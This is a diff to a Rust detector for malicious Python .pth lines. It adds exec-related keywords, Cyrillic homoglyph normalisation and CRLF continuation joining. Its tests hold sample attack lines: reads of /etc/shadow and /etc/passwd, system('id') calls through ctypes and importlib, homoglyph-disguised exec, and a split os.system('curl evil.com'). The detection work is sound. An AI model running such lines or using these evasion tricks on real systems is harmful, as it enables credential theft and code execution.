@@ -118,7 +118,63 @@ const CRITICAL_KEYWORDS: &[&str] = &[
     "os.system(",
     "os.popen(",
     "popen(",
+    "getattr(",
+    "importlib",
+    "open(",
+    "codecs.",
+    "ctypes",
 ];
+
+/// Common Cyrillic/Greek homoglyph substitutions used to evade keyword detection.
+///
+/// Maps Cyrillic/Greek characters to their Latin look-alikes.
+const HOMOGLYPH_MAP: &[(char, char)] = &[
+    ('\u{0430}', 'a'), // Cyrillic а → Latin a
+    ('\u{0435}', 'e'), // Cyrillic е → Latin e
+    ('\u{043E}', 'o'), // Cyrillic о → Latin o
+    ('\u{0441}', 'c'), // Cyrillic с → Latin c
+    ('\u{0440}', 'p'), // Cyrillic р → Latin p
+    ('\u{0445}', 'x'), // Cyrillic х → Latin x
+    ('\u{0456}', 'i'), // Cyrillic і → Latin i
+];
+
+/// Check whether `line` contains any critical keyword spelled with
+/// Cyrillic/Greek homoglyph characters. Returns `true` if a homoglyph
+/// variant of any critical keyword is found.
+fn has_homoglyph_keyword(line: &str) -> bool {
+    // Only bother if the line contains non-ASCII characters
+    if line.is_ascii() {
+        return false;
+    }
+
+    // Normalise homoglyphs to their Latin equivalents
+    let normalised: String = line
+        .chars()
+        .map(|c| {
+            for &(from, to) in HOMOGLYPH_MAP {
+                if c == from {
+                    return to;
+                }
+            }
+            c
+        })
+        .collect();
+
+    // If normalisation changed nothing, no homoglyphs present
+    if normalised == line {
+        return false;
+    }
+
+    let lower = normalised.to_lowercase();
+    for &keyword in CRITICAL_KEYWORDS {
+        if lower.contains(keyword) {
+            return true;
+        }
+    }
+
+    // Also check for "import" with homoglyphs
+    lower.contains("import")
+}
 
 /// Analyse a single `.pth` line and return a verdict.
 ///
@@ -165,6 +221,15 @@ pub fn analyse_pth_line(line: &str) -> PthVerdict {
         };
     }
 
+    // Check for homoglyph variants of critical keywords (e.g. Cyrillic е in
+    // place of Latin e to spell "exec" as "еxec").
+    if has_homoglyph_keyword(trimmed) {
+        return PthVerdict {
+            level: ThreatLevel::Critical,
+            reasons: vec!["homoglyph keyword evasion".to_string()],
+        };
+    }
+
     // Check for import statements (executable .pth lines)
     // Python executes .pth lines that start with "import" (after whitespace)
     let has_import = trimmed.starts_with("import ")
@@ -175,7 +240,7 @@ pub fn analyse_pth_line(line: &str) -> PthVerdict {
     // Also check for Unicode homoglyph evasion in "import"
     let has_non_ascii = trimmed.bytes().any(|b| !b.is_ascii());
     let looks_like_import = has_non_ascii
-        && (lower.contains("mport") || lower.contains("іmport"));
+        && (lower.contains("mport") || lower.contains("\u{0456}mport"));
 
     if has_import || looks_like_import {
         return PthVerdict {
@@ -216,7 +281,7 @@ pub fn analyse_pth_file(content: &str) -> FileAnalysis {
 
     // Join Python continuation lines: a backslash immediately before a
     // newline means the logical line continues on the next physical line.
-    let joined = content.replace("\\\n", "");
+    let joined = content.replace("\\\r\n", "").replace("\\\n", "");
 
     for (idx, line) in joined.lines().enumerate() {
         let verdict = analyse_pth_line(line);
@@ -647,6 +712,105 @@ mod tests {
         let content = "C:\\Python312\\Lib\\site-packages\\pkg";
         let result = analyse_pth_file(content);
         assert_eq!(result.verdict, FileVerdict::Safe);
+    }
+
+    // ============================================================
+    // H6a: Additional critical keywords
+    // ============================================================
+
+    #[test]
+    fn critical_getattr_builtins_exec() {
+        let result = analyse_pth_line("getattr(__builtins__, 'exec')('import os')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn critical_importlib_import_module() {
+        let result = analyse_pth_line("importlib.import_module('os').system('id')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn critical_open_etc_shadow() {
+        let result = analyse_pth_line("open('/etc/shadow').read()");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn critical_codecs_open() {
+        let result = analyse_pth_line("codecs.open('/etc/passwd')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn critical_ctypes_cfunc() {
+        let result = analyse_pth_line("ctypes.CDLL('libc.so.6').system(b'id')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    // ============================================================
+    // H6b: Homoglyph detection for critical keywords
+    // ============================================================
+
+    #[test]
+    fn homoglyph_exec_cyrillic_e() {
+        // U+0435 (Cyrillic е) instead of Latin e in "exec("
+        let result = analyse_pth_line("\u{0435}xec(payload)");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn homoglyph_eval_cyrillic_e() {
+        // U+0435 (Cyrillic е) instead of Latin e in "eval("
+        let result = analyse_pth_line("\u{0435}val(payload)");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn homoglyph_open_cyrillic_o() {
+        // U+043E (Cyrillic о) instead of Latin o in "open("
+        let result = analyse_pth_line("\u{043E}pen('/etc/shadow')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn homoglyph_base64_cyrillic_a() {
+        // U+0430 (Cyrillic а) instead of Latin a in "base64"
+        let result = analyse_pth_line("b\u{0430}se64.b64decode('payload')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn homoglyph_helper_returns_false_for_ascii() {
+        assert!(!has_homoglyph_keyword("exec(payload)"));
+    }
+
+    #[test]
+    fn homoglyph_helper_returns_false_for_unrelated_unicode() {
+        // Japanese characters that aren't homoglyphs
+        assert!(!has_homoglyph_keyword("\u{3042}\u{3044}\u{3046}"));
+    }
+
+    // ============================================================
+    // H6c: \r\n continuation line joining
+    // ============================================================
+
+    #[test]
+    fn continuation_crlf_exec_detected_as_critical() {
+        let content = "ex\\\r\nec(base64.b64decode('payload'))";
+        let result = analyse_pth_file(content);
+        assert_eq!(
+            result.verdict,
+            FileVerdict::Critical,
+            "exec split across \\r\\n continuation lines must still be Critical"
+        );
+    }
+
+    #[test]
+    fn continuation_crlf_os_system_detected_as_critical() {
+        let content = "os.sy\\\r\nstem('curl evil.com')";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Critical);
     }
 }
 
